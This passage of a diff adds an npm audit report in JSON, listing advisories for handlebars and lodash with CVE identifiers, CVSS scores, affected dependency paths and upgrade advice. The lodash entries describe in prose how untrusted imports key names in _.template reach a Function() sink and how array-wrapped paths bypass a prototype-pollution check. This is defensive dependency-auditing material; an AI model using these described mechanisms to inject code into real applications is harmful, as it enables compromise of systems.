+      "cves": ["CVE-2026-33939"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-9cx6-37pm-9jff",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": ["CWE-754"],
+      "url": "https://github.com/advisories/GHSA-9cx6-37pm-9jff"
+    },
+    "1115806": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [".>prisma>@prisma/dev>@mrleebo/prisma-ast>chevrotain>lodash"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4800\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n- https://github.com/advisories/GHSA-r5fr-rjxr-66jc",
+      "created": "2026-04-01T23:51:12.000Z",
+      "id": 1115806,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Code Injection via `_.template` imports key names",
+      "metadata": null,
+      "cves": ["CVE-2026-4800"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.23",
+      "github_advisory_id": "GHSA-r5fr-rjxr-66jc",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:51:13.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": ["CWE-94"],
+      "url": "https://github.com/advisories/GHSA-r5fr-rjxr-66jc"
+    },
+    "1115810": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [".>prisma>@prisma/dev>@mrleebo/prisma-ast>chevrotain>lodash"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-f23m-r3pf-42rh\n- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2950\n- https://github.com/advisories/GHSA-f23m-r3pf-42rh",
+      "created": "2026-04-01T23:50:27.000Z",
+      "id": 1115810,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`",
+      "metadata": null,
+      "cves": ["CVE-2026-2950"],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": "<=4.17.23",
+      "github_advisory_id": "GHSA-f23m-r3pf-42rh",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:50:28.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": ["CWE-1321"],
+      "url": "https://github.com/advisories/GHSA-f23m-r3pf-42rh"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 2,
+      "moderate": 10,
+      "high": 11,
+      "critical": 1
+    },
+    "dependencies": 2262,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 2262
+  }
+}
